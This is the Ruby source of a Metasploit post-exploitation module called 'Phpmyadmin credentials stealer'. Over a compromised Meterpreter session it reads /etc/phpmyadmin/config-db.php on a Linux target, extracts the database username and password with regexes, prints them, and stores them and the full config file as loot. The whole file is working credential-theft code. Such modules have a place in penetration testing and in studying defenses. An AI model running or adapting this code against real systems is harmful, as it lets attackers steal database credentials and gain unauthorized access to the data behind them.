##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post

  include Msf::Post::File
  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::System

  def initialize(info={})
    super(update_info(info,
      'Name'         => "Phpmyadmin credentials stealer",
      'Description'  => %q{
        This module gathers Phpmyadmin creds from target linux machine.
      },
      'License'      => MSF_LICENSE,
      'Platform'     => ['linux'],
      'SessionTypes' => ['meterpreter'],
      'Author'       => [
        'Chaitanya Haritash [bofheaded]',
        'Dhiraj Mishra <dhiraj@notsosecure.com>'
        ]
    ))
   end

  def parse_creds(contents)
    db_user = contents.scan(/\$dbuser\s*=\s*['"](.*)['"];/).flatten.first
    db_pass = contents.scan(/\$dbpass\s*=\s*['"](.*)['"];/).flatten.first

    unless db_user && db_pass
      print_error("Couldn't find PhpMyAdmin credentials")
      return
    end

    print_good("User: #{db_user}")
    print_good("Password: #{db_pass}")

    print_status("Storing credentials...")
    store_valid_credential(user: db_user, private: db_pass)
  end

  def run
    print_line("\nPhpMyAdmin Creds Stealer!\n")

    if session.platform.include?("windows")
      print_error("This module is not compatible with windows")
      return
    end

    conf_path = "/etc/phpmyadmin/config-db.php"
    unless file_exist?(conf_path)
      print_error("#{conf_path} doesn't exist on target")
      return
    end

    print_good('PhpMyAdmin config found!')
    res = read_file(conf_path)
    unless res
      print_error("You may not have permissions to read the file.")
      return
    end

    print_good("Extracting creds")
    parse_creds(res)

    p = store_loot('phpmyadmin_conf', 'text/plain', session, res, 'phpmyadmin_conf.txt', 'phpmyadmin_conf')
    print_good("Config file located at #{p}")
  end
end
